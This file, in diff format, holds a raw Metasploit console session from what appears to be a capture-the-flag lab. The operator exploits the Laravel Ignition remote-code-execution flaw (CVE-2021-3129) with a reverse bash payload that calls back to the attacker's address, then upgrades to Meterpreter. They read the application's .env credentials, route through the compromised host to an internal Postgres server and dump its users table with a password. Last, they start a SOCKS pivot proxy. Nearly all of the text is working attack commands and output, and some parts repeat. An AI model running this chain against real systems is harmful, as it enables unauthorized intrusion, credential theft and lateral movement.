@@ -1,0 +1,1003 @@
+msf6 > search laravel
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
+   1  exploit/multi/php/ignition_laravel_debug_rce      2021-01-13       excellent  Yes    Unauthenticated remote code execution in Ignition
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/php/ignition_laravel_debug_rce                                                                                                                  
+
+msf6 > info 1
+
+       Name: Unauthenticated remote code execution in Ignition
+     Module: exploit/multi/php/ignition_laravel_debug_rce
+   Platform: Unix, Linux, OSX, Windows
+       Arch: 
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2021-01-13
+
+Provided by:
+  Heyder Andrade <eu@heyderandrade.org>
+  ambionics
+
+Module side effects:
+ ioc-in-logs
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Unix (In-Memory)
+  1   Windows (In-Memory)
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting              Required  Description
+  ----       ---------------              --------  -----------
+  LOGFILE                                 no        Laravel log file absolute path
+  Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-f
+                                                    ramework/wiki/Using-Metasploit
+  RPORT      80                           yes       The target port (TCP)
+  SSL        false                        no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /_ignition/execute-solution  yes       Ignition execute solution path
+  VHOST                                   no        HTTP server virtual host
+
+Payload information:
+
+Description:
+  Ignition before 2.5.2, as used in Laravel and other products, allows 
+  unauthenticated remote attackers to execute arbitrary code because 
+  of insecure usage of file_get_contents() and file_put_contents(). 
+  This is exploitable on sites using debug mode with Laravel before 
+  8.4.2.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2021-3129
+  https://www.ambionics.io/blog/laravel-debug-rce
+
+msf6 > 
+msf6 > use 1
+[*] Using configured payload cmd/unix/reverse_bash
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > info
+
+       Name: Unauthenticated remote code execution in Ignition
+     Module: exploit/multi/php/ignition_laravel_debug_rce
+   Platform: Unix, Linux, OSX, Windows
+       Arch: 
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2021-01-13
+
+Provided by:
+  Heyder Andrade <eu@heyderandrade.org>
+  ambionics
+
+Module side effects:
+ ioc-in-logs
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Unix (In-Memory)
+  1   Windows (In-Memory)
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting              Required  Description
+  ----       ---------------              --------  -----------
+  LOGFILE                                 no        Laravel log file absolute path
+  Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-f
+                                                    ramework/wiki/Using-Metasploit
+  RPORT      80                           yes       The target port (TCP)
+  SSL        false                        no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /_ignition/execute-solution  yes       Ignition execute solution path
+  VHOST                                   no        HTTP server virtual host
+
+Payload information:
+
+Description:
+  Ignition before 2.5.2, as used in Laravel and other products, allows 
+  unauthenticated remote attackers to execute arbitrary code because 
+  of insecure usage of file_get_contents() and file_put_contents(). 
+  This is exploitable on sites using debug mode with Laravel before 
+  8.4.2.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2021-3129
+  https://www.ambionics.io/blog/laravel-debug-rce
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > set RHOSTS 10.10.125.61
+RHOSTS => 10.10.125.61
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > 
+RHOSTS => 10.10.125.61
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > show options
+
+Module options (exploit/multi/php/ignition_laravel_debug_rce):
+
+   Name       Current Setting              Required  Description
+   ----       ---------------              --------  -----------
+   LOGFILE                                 no        Laravel log file absolute path
+   Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.125.61                 yes       The target host(s), see https://github.com/rapid7/metasploit-
+                                                     framework/wiki/Using-Metasploit
+   RPORT      80                           yes       The target port (TCP)
+   SSL        false                        no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /_ignition/execute-solution  yes       Ignition execute solution path
+   VHOST                                   no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_bash):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Unix (In-Memory)
+
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > check
+
+[*] Checking component version to 10.10.125.61:80
+[*] 10.10.125.61:80 - The target appears to be vulnerable.
+msf6 exploit(multi/php/ignition_laravel_debug_rce) >
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Unix (In-Memory)
+   1   Windows (In-Memory)
+
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > show paylods
+[-] Invalid parameter "paylods", use "show -h" for more information
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > show payloads
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > ip a
+[*] exec: ip a
+
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:0c:29:09:89:d8 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.193.128/24 brd 192.168.193.255 scope global dynamic noprefixroute eth0
+       valid_lft 1552sec preferred_lft 1552sec
+    inet6 fe80::8d01:e265:a452:cda0/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none 
+    inet 10.8.28.227/16 scope global tun0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::4ca4:2886:5adb:db6f/64 scope link stable-privacy 
+       valid_lft forever preferred_lft forever
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > set LHOST tun0
+LHOST => 10.8.28.227
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > show options
+
+Module options (exploit/multi/php/ignition_laravel_debug_rce):
+
+   Name       Current Setting              Required  Description
+   ----       ---------------              --------  -----------
+   LOGFILE                                 no        Laravel log file absolute path
+   Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.125.61                 yes       The target host(s), see https://github.com/rapid7/metasploit-
+                                                     framework/wiki/Using-Metasploit
+   RPORT      80                           yes       The target port (TCP)
+   SSL        false                        no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /_ignition/execute-solution  yes       Ignition execute solution path
+   VHOST                                   no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_bash):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.8.28.227      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Unix (In-Memory)
+
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > info
+
+       Name: Unauthenticated remote code execution in Ignition
+     Module: exploit/multi/php/ignition_laravel_debug_rce
+   Platform: Unix, Linux, OSX, Windows
+       Arch: 
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2021-01-13
+
+Provided by:
+  Heyder Andrade <eu@heyderandrade.org>
+  ambionics
+
+Module side effects:
+ ioc-in-logs
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Unix (In-Memory)
+  1   Windows (In-Memory)
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting              Required  Description
+  ----       ---------------              --------  -----------
+  LOGFILE                                 no        Laravel log file absolute path
+  Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS     10.10.125.61                 yes       The target host(s), see https://github.com/rapid7/metasploit-f
+                                                    ramework/wiki/Using-Metasploit
+  RPORT      80                           yes       The target port (TCP)
+  SSL        false                        no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /_ignition/execute-solution  yes       Ignition execute solution path
+  VHOST                                   no        HTTP server virtual host
+
+Payload information:
+
+Description:
+  Ignition before 2.5.2, as used in Laravel and other products, allows 
+  unauthenticated remote attackers to execute arbitrary code because 
+  of insecure usage of file_get_contents() and file_put_contents(). 
+  This is exploitable on sites using debug mode with Laravel before 
+  8.4.2.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2021-3129
+  https://www.ambionics.io/blog/laravel-debug-rce
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > 
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > exploit
+
+[*] Started reverse TCP handler on 10.8.28.227:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Checking component version to 10.10.125.61:80
+[+] The target appears to be vulnerable.
+[*] Command shell session 1 opened (10.8.28.227:4444 -> 10.10.125.61:55192) at 2022-12-10 03:53:20 -0500
+id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+                                                                                                                    
+      
+
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > exploit
+
+[*] Started reverse TCP handler on 10.8.28.227:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Checking component version to 10.10.125.61:80
+[+] The target appears to be vulnerable.
+[*] Command shell session 1 opened (10.8.28.227:4444 -> 10.10.125.61:55192) at 2022-12-10 03:53:20 -0500
+id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+background
+                                                                                                                    
+Background session 1? [y/N]  y                                                                                      
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions                                                       
+                                                                                                                    
+Active sessions                                                                                                     
+===============                                                                                                     
+                                                                                                                    
+  Id  Name  Type            Information  Connection                                                                 
+  --  ----  ----            -----------  ----------                                                                 
+  1         shell cmd/unix               10.8.28.227:4444 -> 10.10.125.61:55192 (10.10.125.61)                      
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions -u 1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.8.28.227:4433 
+[*] Sending stage (1017704 bytes) to 10.10.125.61
+[*] Command stager progress: 100.00% (773/773 bytes)
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > [*] Meterpreter session 2 opened (10.8.28.227:4433 -> 10.10.125.61:54540) at 2022-12-10 03:56:36 -0500
+
+[*] Stopping exploit/multi/handler
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > 
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1         shell cmd/unix                                   10.8.28.227:4444 -> 10.10.125.61:55192 (10.10.125.61)
+  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.8.28.227:4433 -> 10.10.125.61:54540 (172.28.101.50
+                                                             )
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > 
+
+                                                             )
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > help
+meterpreter > getuid
+Server username: www-data
+meterpreter > getpid
+Current pid: 36
+meterpreter > ps
+
+Process List
+============
+
+ PID  PPID  Name     Arch    User      Path
+ ---  ----  ----     ----    ----      ----
+ 1    0     apache2  x86_64  root
+ 16   1     apache2  x86_64  www-data
+ 17   1     apache2  x86_64  www-data
+ 18   1     apache2  x86_64  www-data
+ 19   1     apache2  x86_64  www-data
+ 21   1     apache2  x86_64  www-data
+ 22   1     apache2  x86_64  www-data
+ 23   1     apache2  x86_64  www-data
+ 24   1     apache2  x86_64  www-data
+ 25   1     apache2  x86_64  www-data
+ 26   1     apache2  x86_64  www-data
+ 27   16    sh       x86_64  www-data  /bin/dash
+ 28   27    bash     x86_64  www-data  /bin/bash
+ 29   28    sh       x86_64  www-data  /bin/dash
+ 36   29    ziXsN    x86_64  www-data  /tmp/ziXsN (deleted)
+
+meterpreter > ls /
+Listing: /
+==========
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100755/rwxr-xr-x  0     fil   2022-09-13 15:39:42 -0400  .dockerenv
+040755/rwxr-xr-x  4096  dir   2022-09-13 05:48:51 -0400  bin
+040755/rwxr-xr-x  4096  dir   2022-09-03 08:10:00 -0400  boot
+040755/rwxr-xr-x  340   dir   2022-12-10 03:16:02 -0500  dev
+040755/rwxr-xr-x  4096  dir   2022-09-13 15:39:42 -0400  etc
+040755/rwxr-xr-x  4096  dir   2022-09-03 08:10:00 -0400  home
+040755/rwxr-xr-x  4096  dir   2022-09-13 05:45:24 -0400  lib
+040755/rwxr-xr-x  4096  dir   2022-09-11 20:00:00 -0400  lib64
+040755/rwxr-xr-x  4096  dir   2022-09-11 20:00:00 -0400  media
+040755/rwxr-xr-x  4096  dir   2022-09-11 20:00:00 -0400  mnt
+040755/rwxr-xr-x  4096  dir   2022-09-11 20:00:00 -0400  opt
+040555/r-xr-xr-x  0     dir   2022-12-10 03:16:01 -0500  proc
+040700/rwx------  4096  dir   2022-09-13 13:03:40 -0400  root
+040755/rwxr-xr-x  4096  dir   2022-09-13 05:48:53 -0400  run
+040755/rwxr-xr-x  4096  dir   2022-09-13 05:48:51 -0400  sbin
+040755/rwxr-xr-x  4096  dir   2022-09-11 20:00:00 -0400  srv
+040555/r-xr-xr-x  0     dir   2022-12-10 03:16:02 -0500  sys
+041777/rwxrwxrwx  4096  dir   2022-12-10 03:56:34 -0500  tmp
+040755/rwxr-xr-x  4096  dir   2022-09-11 20:00:00 -0400  usr
+040755/rwxr-xr-x  4096  dir   2022-09-13 05:45:28 -0400  var
+
+meterpreter > 
+meterpreter > shell
+Process 41 created.
+Channel 1 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+env
+USER=www-data
+HOME=/var/www
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
+LANG=C
+PWD=/var/www/html
+cd /var/www
+ls -la
+total 324
+drwxr-xr-x 1 www-data www-data   4096 Sep 13 19:39 .
+drwxr-xr-x 1 root     root       4096 Sep 13 09:45 ..
+-rw-r--r-- 1      503 staff       868 Sep 12 17:08 .env
+drwxr-xr-x 1 www-data www-data   4096 Sep 13 16:55 app
+-rwxr-xr-x 1 www-data www-data   1686 Sep 11 00:44 artisan
+drwxr-xr-x 1 www-data www-data   4096 Sep 13 16:59 bootstrap
+-rw-r--r-- 1 www-data www-data   1613 Sep 11 00:44 composer.json
+-rw-r--r-- 1 www-data www-data 247888 Sep 11 01:01 composer.lock
+drwxr-xr-x 1 www-data www-data   4096 Sep 13 16:55 config
+drwxr-xr-x 1 www-data www-data   4096 Sep 13 16:55 database
+drwxr-xr-x 2 www-data www-data   4096 Sep 13 16:55 html
+-rw-r--r-- 1 www-data www-data    944 Sep 11 00:44 package.json
+drwxr-xr-x 1 www-data www-data   4096 Sep 13 16:55 resources
+drwxr-xr-x 1 www-data www-data   4096 Sep 13 16:55 routes
+-rw-r--r-- 1 www-data www-data    563 Sep 11 00:44 server.php
+drwxr-xr-x 1 www-data www-data   4096 Sep 13 16:59 storage
+drwxr-xr-x 1 www-data www-data   4096 Sep 13 17:04 vendor
+-rw-r--r-- 1 www-data www-data    559 Sep 11 01:14 webpack.mix.js
+cat .env
+APP_NAME=Laravel
+APP_ENV=local
+APP_KEY=base64:NEMESCXelEv2iYzbgq3N30b9IAnXzQmR7LnSzt70rso=
+APP_DEBUG=true
+APP_URL=http://localhost
+
+LOG_CHANNEL=stack
+LOG_LEVEL=debug
+
+DB_CONNECTION=pgsql
+DB_HOST=webservice_database
+DB_PORT=5432
+DB_DATABASE=postgres
+DB_USERNAME=postgres
+DB_PASSWORD=postgres
+
+BROADCAST_DRIVER=log
+CACHE_DRIVER=file
+QUEUE_CONNECTION=sync
+SESSION_DRIVER=file
+SESSION_LIFETIME=120
+
+REDIS_HOST=127.0.0.1
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+
+MAIL_MAILER=smtp
+MAIL_HOST=smtp.mailtrap.io
+MAIL_PORT=2525
+MAIL_USERNAME=null
+MAIL_PASSWORD=null
+MAIL_ENCRYPTION=null
+MAIL_FROM_ADDRESS=null
+MAIL_FROM_NAME="${APP_NAME}"
+
+AWS_ACCESS_KEY_ID=
+AWS_SECRET_ACCESS_KEY=
+AWS_DEFAULT_REGION=us-east-1
+AWS_BUCKET=
+
+PUSHER_APP_ID=
+PUSHER_APP_KEY=
+PUSHER_APP_SECRET=
+PUSHER_APP_CLUSTER=mt1
+
+MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
+MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
+exit
+meterpreter > resolve webservice_database
+
+Host resolutions
+================
+
+    Hostname             IP Address
+    --------             ----------
+    webservice_database  172.28.101.51
+
+meterpreter > 
+
+meterpreter > shell
+Process 46 created.
+Channel 2 created.
+ip a
+/bin/sh: 1: ip: not found
+ifconfig
+/bin/sh: 2: ifconfig: not found
+ping 172.17.0.1
+/bin/sh: 3: ping: not found
+exit
+meterpreter > background
+[*] Backgrounding session 2...
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1         shell cmd/unix                                   10.8.28.227:4444 -> 10.10.125.61:55192 (10.10.125.61)
+  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.8.28.227:4433 -> 10.10.125.61:54540 (172.28.101.50
+                                                             )
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > route -h
+Route traffic destined to a given subnet through a supplied session.
+
+Usage:
+  route [add/remove] subnet netmask [comm/sid]
+  route [add/remove] cidr [comm/sid]
+  route [get] <host or network>
+  route [flush]
+  route [print]
+
+Subcommands:
+  add - make a new route
+  remove - delete a route; 'del' is an alias
+  flush - remove all routes
+  get - display the route for a given target
+  print - show all active routes
+
+Examples:
+  Add a route for all hosts from 192.168.0.0 to 192.168.0.255 through session 1
+    route add 192.168.0.0 255.255.255.0 1
+    route add 192.168.0.0/24 1
+
+  Delete the above route
+    route remove 192.168.0.0/24 1
+    route del 192.168.0.0 255.255.255.0 1
+
+  Display the route that would be used for the given host or network
+    route get 192.168.0.11
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.28.101.51
+[-] Missing arguments to route add.
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.28.101.51/32
+[-] Missing arguments to route add.
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.28.101.51/32 2
+[*] Route added
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.17.0.1/32 2
+[*] Route added
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > route print
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.17.0.1         255.255.255.255    Session 2
+   172.28.101.51      255.255.255.255    Session 2
+
+[*] There are currently no IPv6 routes defined.
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > 
+.
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > search postgres
+
+   16  auxiliary/scanner/postgres/postgres_schemadump                               normal     No     Postgres Schema Dump
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > use 16
+msf6 auxiliary(scanner/postgres/postgres_schemadump) > info
+
+       Name: Postgres Schema Dump
+     Module: auxiliary/scanner/postgres/postgres_schemadump
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  theLightCosine <theLightCosine@metasploit.com>
+
+Check supported:
+  No
+
+Basic options:
+  Name               Current Setting      Required  Description
+  ----               ---------------      --------  -----------
+  DATABASE           postgres             yes       The database to authenticate against
+  DISPLAY_RESULTS    true                 yes       Display the Results to the Screen
+  IGNORED_DATABASES  template1,template0  yes       Comma separated list of databases to ignore during the schema
+                                                    dump
+  PASSWORD           postgres             no        The password for the specified username. Leave blank for a ran
+                                                    dom password.
+  RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-f
+                                                    ramework/wiki/Using-Metasploit
+  RPORT              5432                 yes       The target port
+  THREADS            1                    yes       The number of concurrent threads (max one per host)
+  USERNAME           postgres             yes       The username to authenticate as
+
+Description:
+  This module extracts the schema information from a Postgres server.
+
+msf6 auxiliary(scanner/postgres/postgres_schemadump) > set RHOST 172.28.101.51
+RHOST => 172.28.101.51
+msf6 auxiliary(scanner/postgres/postgres_schemadump) > show options
+
+Module options (auxiliary/scanner/postgres/postgres_schemadump):
+
+   Name               Current Setting      Required  Description
+   ----               ---------------      --------  -----------
+   DATABASE           postgres             yes       The database to authenticate against
+   DISPLAY_RESULTS    true                 yes       Display the Results to the Screen
+   IGNORED_DATABASES  template1,template0  yes       Comma separated list of databases to ignore during the schema
+                                                      dump
+   PASSWORD           postgres             no        The password for the specified username. Leave blank for a ra
+                                                     ndom password.
+   RHOSTS             172.28.101.51        yes       The target host(s), see https://github.com/rapid7/metasploit-
+                                                     framework/wiki/Using-Metasploit
+   RPORT              5432                 yes       The target port
+   THREADS            1                    yes       The number of concurrent threads (max one per host)
+   USERNAME           postgres             yes       The username to authenticate as
+
+msf6 auxiliary(scanner/postgres/postgres_schemadump) > exploit
+
+[*] 172.28.101.51:5432 - Found databases: postgres, template1, template0. Ignoring template1, template0.
+[+] Postgres SQL Server Schema 
+ Host: 172.28.101.51 
+ Port: 5432 
+ ====================
+
+---
+- DBName: postgres
+  Tables:
+  - TableName: users_id_seq
+    Columns:
+    - ColumnName: last_value
+      ColumnType: int8
+      ColumnLength: '8'
+    - ColumnName: log_cnt
+      ColumnType: int8
+      ColumnLength: '8'
+    - ColumnName: is_called
+      ColumnType: bool
+      ColumnLength: '1'
+  - TableName: users
+    Columns:
+    - ColumnName: id
+      ColumnType: int4
+      ColumnLength: '4'
+    - ColumnName: username
+      ColumnType: varchar
+      ColumnLength: "-1"
+    - ColumnName: password
+      ColumnType: varchar
+      ColumnLength: "-1"
+    - ColumnName: created_at
+      ColumnType: timestamp
+      ColumnLength: '8'
+    - ColumnName: deleted_at
+      ColumnType: timestamp
+      ColumnLength: '8'
+  - TableName: users_pkey
+    Columns:
+    - ColumnName: id
+      ColumnType: int4
+      ColumnLength: '4'
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/postgres/postgres_schemadump) >  search postgres
+   11  auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query
+
+
+msf6 auxiliary(scanner/postgres/postgres_schemadump) > use 11
+msf6 auxiliary(admin/postgres/postgres_sql) > options
+
+Module options (auxiliary/admin/postgres/postgres_sql):
+
+   Name           Current Setting   Required  Description
+   ----           ---------------   --------  -----------
+   DATABASE       template1         yes       The database to authenticate against
+   PASSWORD       postgres          no        The password for the specified username. Leave blank for a random pa
+                                              ssword.
+   RETURN_ROWSET  true              no        Set to true to see query result sets
+   RHOSTS                           yes       The target host(s), see https://github.com/rapid7/metasploit-framewo
+                                              rk/wiki/Using-Metasploit
+   RPORT          5432              yes       The target port
+   SQL            select version()  no        The SQL query to execute
+   USERNAME       postgres          yes       The username to authenticate as
+   VERBOSE        false             no        Enable verbose output
+
+msf6 auxiliary(admin/postgres/postgres_sql) > set rhosts 172.28.101.51
+rhosts => 172.28.101.51
+msf6 auxiliary(admin/postgres/postgres_sql) > options
+
+Module options (auxiliary/admin/postgres/postgres_sql):
+
+   Name           Current Setting   Required  Description
+   ----           ---------------   --------  -----------
+   DATABASE       template1         yes       The database to authenticate against
+   PASSWORD       postgres          no        The password for the specified username. Leave blank for a random pa
+                                              ssword.
+   RETURN_ROWSET  true              no        Set to true to see query result sets
+   RHOSTS         172.28.101.51     yes       The target host(s), see https://github.com/rapid7/metasploit-framewo
+                                              rk/wiki/Using-Metasploit
+   RPORT          5432              yes       The target port
+   SQL            select version()  no        The SQL query to execute
+   USERNAME       postgres          yes       The username to authenticate as
+   VERBOSE        false             no        Enable verbose output
+
+msf6 auxiliary(admin/postgres/postgres_sql) > set DATABASE postgres
+DATABASE => postgres
+msf6 auxiliary(admin/postgres/postgres_sql) > exploit
+[*] Running module against 172.28.101.51
+
+Query Text: 'select version()'
+==============================
+
+    version
+    -------
+    PostgreSQL 10.5 on x86_64-pc-linux-musl, compiled by gcc (Alpine 6.4.0) 6.4.0, 64-bit
+
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/postgres/postgres_sql) > 
+[*] Running module against 172.28.101.51
+
+Query Text: 'select version()'
+==============================
+
+    version
+    -------
+    PostgreSQL 10.5 on x86_64-pc-linux-musl, compiled by gcc (Alpine 6.4.0) 6.4.0, 64-bit
+
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/postgres/postgres_sql) > set SQL "SELECT * from users"
+SQL => SELECT * from users
+msf6 auxiliary(admin/postgres/postgres_sql) > exploit
+[*] Running module against 172.28.101.51
+
+Query Text: 'SELECT * from users'
+=================================
+
+    id  username  password  created_at                  deleted_at
+    --  --------  --------  ----------                  ----------
+    1   santa     p4$$w0rd  2022-09-13 19:39:51.669279  NIL
+
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/postgres/postgres_sql) > 
+msf6 auxiliary(admin/postgres/postgres_sql) > exploit
+[*] Running module against 172.28.101.51
+
+Query Text: 'SELECT * from users'
+=================================
+
+    id  username  password  created_at                  deleted_at
+    --  --------  --------  ----------                  ----------
+    1   santa     p4$$w0rd  2022-09-13 19:39:51.669279  NIL
+
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/postgres/postgres_sql) > search socks
+
+Matching Modules
+================
+
+   #  Name                                     Disclosure Date  Rank    Check  Description
+   -  ----                                     ---------------  ----    -----  -----------
+   0  auxiliary/server/socks_proxy                              normal  No     SOCKS Proxy Server
+   1  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection
+   2  auxiliary/scanner/http/sockso_traversal  2012-03-14       normal  No     Sockso Music Host Server 1.5 Directory Traversal
+
+
+Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/sockso_traversal
+
+msf6 auxiliary(admin/postgres/postgres_sql) > use 0
+msf6 auxiliary(server/socks_proxy) > info
+
+       Name: SOCKS Proxy Server
+     Module: auxiliary/server/socks_proxy
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  sf <stephen_fewer@harmonysecurity.com>
+  Spencer McIntyre
+  surefire
+
+Available actions:
+  Name   Description
+  ----   -----------
+  Proxy  Run a SOCKS proxy server
+
+Check supported:
+  No
+
+Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  PASSWORD                   no        Proxy password for SOCKS5 listener
+  SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address o
+                                       n the local machine or 0.0.0.0 to listen on all addresses.
+  SRVPORT   1080             yes       The port to listen on
+  USERNAME                   no        Proxy username for SOCKS5 listener
+  VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)
+
+Description:
+  This module provides a SOCKS proxy server that uses the builtin 
+  Metasploit routing to relay connections.
+
+msf6 auxiliary(server/socks_proxy) > route print
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.17.0.1         255.255.255.255    Session 2
+   172.28.101.51      255.255.255.255    Session 2
+
+[*] There are currently no IPv6 routes defined.
+msf6 auxiliary(server/socks_proxy) > show options
+
+Module options (auxiliary/server/socks_proxy):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        Proxy password for SOCKS5 listener
+   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address
+                                        on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT   1080             yes       The port to listen on
+   USERNAME                   no        Proxy username for SOCKS5 listener
+   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
+
+
+msf6 auxiliary(server/socks_proxy) > run
+[*] Auxiliary module running as background job 1.
+
+[*] Starting the SOCKS proxy server
+msf6 auxiliary(server/socks_proxy) > jobs
+
+Jobs
+====
+
+  Id  Name                           Payload  Payload opts
+  --  ----                           -------  ------------
+  1   Auxiliary: server/socks_proxy
+
+msf6 auxiliary(server/socks_proxy) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1         shell cmd/unix                                   10.8.28.227:4444 -> 10.10.125.61:55192 (10.10.125.61)
